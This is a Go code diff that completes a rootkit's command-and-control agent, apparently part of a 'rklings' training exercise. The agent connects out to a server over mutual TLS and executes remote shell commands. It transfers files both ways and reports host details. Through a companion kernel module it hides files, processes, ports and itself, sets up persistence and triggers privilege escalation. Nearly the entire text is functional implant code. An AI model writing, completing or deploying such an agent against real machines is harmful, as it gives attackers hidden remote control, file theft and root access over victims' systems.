@@ -2,16 +2,23 @@ package main
 
 import (
 	"bufio"
+	"bytes"
 	"crypto/tls"
 	"crypto/x509"
 	_ "embed"
+	"encoding/base64"
+	"encoding/json"
 	"fmt"
 	"io"
 	"os"
 	"os/exec"
+	"runtime"
 	"strconv"
 	"strings"
+	"sync"
 	"time"
+
+	"github.com/creack/pty"
 )
 
 //go:embed certs/ca.crt
@@ -39,9 +46,13 @@ func main() {
 }
 
 func serve(conn *tls.Conn) {
-	scanner := bufio.NewScanner(conn)
-	for scanner.Scan() {
-		line := scanner.Text()
+	r := bufio.NewReader(conn)
+	for {
+		line, err := r.ReadString('\n')
+		if err != nil {
+			return
+		}
+		line = strings.TrimRight(line, "\r\n")
 		parts := strings.SplitN(line, " ", 2)
 		cmd := parts[0]
 		arg := ""
@@ -53,18 +64,30 @@ func serve(conn *tls.Conn) {
 		case "PING":
 			fmt.Fprintln(conn, "PONG")
 		case "STATUS":
-			// TODO: report PID, uid, uptime
+			fmt.Fprintf(conn, "PID=%d UID=%d\n", os.Getpid(), os.Getuid())
+		case "INFO":
+			handleInfo(conn)
 		case "SHELL":
 			handleShell(conn, arg)
+		case "PTY":
+			handlePTY(conn, arg)
 		case "DOWNLOAD":
 			handleDownload(conn, arg)
 		case "UPLOAD":
-			handleUpload(conn, scanner, arg)
+			handleUpload(conn, r, arg)
 		case "HIDE":
 			handleHide(conn, arg)
+		case "UNHIDE":
+			handleUnhide(conn, arg)
 		case "PERSIST":
-			os.Mkdir("/tmp/rklings.persist", 0755)
-			fmt.Fprintln(conn, "OK")
+			if err := trigger("persist"); err != nil {
+				fmt.Fprintf(conn, "ERR %v\n", err)
+			} else {
+				control.Lock()
+				control.persisted = true
+				control.Unlock()
+				fmt.Fprintln(conn, "OK")
+			}
 		case "ESCALATE":
 			handleEscalate(conn, arg)
 		default:
@@ -73,7 +96,85 @@ func serve(conn *tls.Conn) {
 	}
 }
 
-// dial establishes an mTLS connection to the server.
+var control = struct {
+	sync.Mutex
+	hidden    map[string][]string
+	persisted bool
+}{hidden: map[string][]string{"file": {}, "content": {}, "pid": {}, "port": {}}}
+
+type agentInfo struct {
+	Hostname     string              `json:"hostname"`
+	Kernel       string              `json:"kernel"`
+	Arch         string              `json:"arch"`
+	PID          int                 `json:"pid"`
+	UID          int                 `json:"uid"`
+	ModuleHidden bool                `json:"module_hidden"`
+	Persisted    bool                `json:"persisted"`
+	Hidden       map[string][]string `json:"hidden"`
+}
+
+func handleInfo(conn *tls.Conn) {
+	hostname, _ := os.Hostname()
+	kernelBytes, _ := os.ReadFile("/proc/sys/kernel/osrelease")
+	_, moduleExists := os.Stat("/sys/module/rklings")
+	modules, _ := os.ReadFile("/proc/modules")
+	control.Lock()
+	hidden := make(map[string][]string, len(control.hidden))
+	for kind, values := range control.hidden {
+		hidden[kind] = append([]string(nil), values...)
+	}
+	info := agentInfo{
+		Hostname: hostname, Kernel: strings.TrimSpace(string(kernelBytes)), Arch: runtime.GOARCH,
+		PID: os.Getpid(), UID: os.Getuid(), Persisted: control.persisted, Hidden: hidden,
+		ModuleHidden: moduleExists == nil && !bytes.Contains(modules, []byte("rklings ")),
+	}
+	control.Unlock()
+	data, err := json.Marshal(info)
+	if err != nil {
+		fmt.Fprintf(conn, "ERR %v\n", err)
+		return
+	}
+	fmt.Fprintf(conn, "INFO %s\n", data)
+}
+
+func trigger(command string) error {
+	path := "rklings." + command
+	if err := os.Mkdir(path, 0755); err != nil && !os.IsExist(err) {
+		return err
+	}
+	return os.Remove(path)
+}
+
+var shellPTY struct {
+	sync.Mutex
+	file   *os.File
+	output []byte
+}
+
+func handlePTY(conn *tls.Conn, arg string) {
+	// TODO: implement START, INPUT, RESIZE, and CLOSE against shellPTY. Encode
+	// binary input/output as base64 and protect all shared PTY state with its
+	// mutex. Every non-error response uses "DATA <base64>".
+	fmt.Fprintln(conn, "ERR implement PTY lifecycle")
+}
+
+func readPTY(file *os.File) {
+	buf := make([]byte, 4096)
+	for {
+		n, err := file.Read(buf)
+		if n > 0 {
+			shellPTY.Lock()
+			if shellPTY.file == file {
+				shellPTY.output = append(shellPTY.output, buf[:n]...)
+			}
+			shellPTY.Unlock()
+		}
+		if err != nil {
+			return
+		}
+	}
+}
+
 func dial() (*tls.Conn, error) {
 	serverAddr := os.Getenv("RKLINGS_SERVER_ADDR")
 	if serverAddr == "" {
@@ -94,42 +195,148 @@ func dial() (*tls.Conn, error) {
 	})
 }
 
-// handleShell executes a command via sh -c and sends output.
-// Output lines end with a single dot on its own line.
 func handleShell(conn *tls.Conn, cmd string) {
-	// TODO: run a shell command and send lines followed by "."
+	out, err := exec.Command("sh", "-c", cmd).CombinedOutput()
+	if err != nil {
+		fmt.Fprintf(conn, "ERR %v\n", err)
+	}
+	if len(out) > 0 {
+		conn.Write(out)
+		if out[len(out)-1] != '\n' {
+			fmt.Fprintln(conn)
+		}
+	}
+	fmt.Fprintln(conn, ".")
 }
 
-// handleDownload sends a file: size line, then raw bytes.
 func handleDownload(conn *tls.Conn, path string) {
-	// TODO: send the file size followed by its bytes
+	info, err := os.Stat(path)
+	if err != nil {
+		fmt.Fprintf(conn, "ERR %v\n", err)
+		return
+	}
+
+	f, err := os.Open(path)
+	if err != nil {
+		fmt.Fprintf(conn, "ERR %v\n", err)
+		return
+	}
+	defer f.Close()
+
+	fmt.Fprintf(conn, "%d\n", info.Size())
+	io.Copy(conn, f)
 }
 
-// handleUpload receives a file: size line, then raw bytes.
-func handleUpload(conn *tls.Conn, scanner *bufio.Scanner, path string) {
-	// TODO: read the size and copy exactly that many bytes into the file
+func handleUpload(conn *tls.Conn, r *bufio.Reader, path string) {
+	sizeLine, err := r.ReadString('\n')
+	if err != nil {
+		fmt.Fprintln(conn, "ERR no size line")
+		return
+	}
+	size, err := strconv.ParseInt(strings.TrimSpace(sizeLine), 10, 64)
+	if err != nil {
+		fmt.Fprintf(conn, "ERR bad size: %v\n", err)
+		return
+	}
+
+	f, err := os.Create(path)
+	if err != nil {
+		fmt.Fprintf(conn, "ERR %v\n", err)
+		return
+	}
+	defer f.Close()
+
+	// Read from the buffered reader, not the raw conn.
+	_, err = io.CopyN(f, r, size)
+	if err != nil {
+		fmt.Fprintf(conn, "ERR %v\n", err)
+		return
+	}
+	fmt.Fprintln(conn, "OK")
 }
 
-// handleHide dispatches HIDE subcommands to mkdir.
-// Format: "HIDE FILE <name>", "HIDE PID <pid>", "HIDE PORT <port>", "HIDE CONTENT <str>"
 func handleHide(conn *tls.Conn, arg string) {
 	parts := strings.SplitN(arg, " ", 2)
+	if parts[0] == "MODULE" {
+		if err := trigger("h.m"); err != nil {
+			fmt.Fprintf(conn, "ERR %v\n", err)
+			return
+		}
+		fmt.Fprintln(conn, "OK")
+		return
+	}
 	if len(parts) < 2 {
 		fmt.Fprintln(conn, "ERR need: HIDE <type> <value>")
 		return
 	}
 
-	// TODO: map type to mkdir command prefix (FILE->h.f, PID->h.i, PORT->h.p, CONTENT->h.c)
-	//       then os.Mkdir("/tmp/rklings.<prefix>.<value>", 0755)
+	prefixes := map[string]string{
+		"FILE": "h.f", "PID": "h.i", "PORT": "h.p", "CONTENT": "h.c",
+	}
+	prefix, ok := prefixes[parts[0]]
+	if !ok {
+		fmt.Fprintf(conn, "ERR unknown hide type: %s\n", parts[0])
+		return
+	}
+
+	if err := trigger(prefix + "." + parts[1]); err != nil {
+		fmt.Fprintf(conn, "ERR %v\n", err)
+		return
+	}
+	control.Lock()
+	control.hidden[strings.ToLower(parts[0])] = append(control.hidden[strings.ToLower(parts[0])], parts[1])
+	control.Unlock()
+	fmt.Fprintln(conn, "OK")
 }
 
-// handleEscalate triggers privilege escalation via mkdir.
+func handleUnhide(conn *tls.Conn, arg string) {
+	parts := strings.SplitN(arg, " ", 2)
+	if parts[0] == "MODULE" {
+		if err := trigger("u.m"); err != nil {
+			fmt.Fprintf(conn, "ERR %v\n", err)
+			return
+		}
+		fmt.Fprintln(conn, "OK")
+		return
+	}
+	if len(parts) != 2 {
+		fmt.Fprintln(conn, "ERR need: UNHIDE <type> <value>")
+		return
+	}
+	prefixes := map[string]string{"FILE": "u.f", "PID": "u.i", "PORT": "u.p", "CONTENT": "u.c"}
+	prefix, ok := prefixes[parts[0]]
+	kind := strings.ToLower(parts[0])
+	control.Lock()
+	values := control.hidden[kind]
+	index := -1
+	for i, value := range values {
+		if value == parts[1] {
+			index = i
+			break
+		}
+	}
+	valid := ok && index >= 0
+	control.Unlock()
+	if !valid {
+		fmt.Fprintln(conn, "ERR invalid target")
+		return
+	}
+	if err := trigger(prefix + "." + parts[1]); err != nil {
+		fmt.Fprintf(conn, "ERR %v\n", err)
+		return
+	}
+	control.Lock()
+	values = control.hidden[kind]
+	control.hidden[kind] = append(values[:index], values[index+1:]...)
+	control.Unlock()
+	fmt.Fprintln(conn, "OK")
+}
+
 func handleEscalate(conn *tls.Conn, arg string) {
-	// TODO: if arg is empty, mkdir rklings.e; otherwise mkdir rklings.e.<arg>
+	if arg != "" {
+		os.Mkdir("rklings.e."+arg, 0755)
+	} else {
+		os.Mkdir("rklings.e", 0755)
+	}
+	fmt.Fprintln(conn, "OK")
 }
-
-// Ensure imports compile.
-var _ = io.Copy
-var _ = os.Stat
-var _ = exec.Command
-var _ = strconv.ParseInt
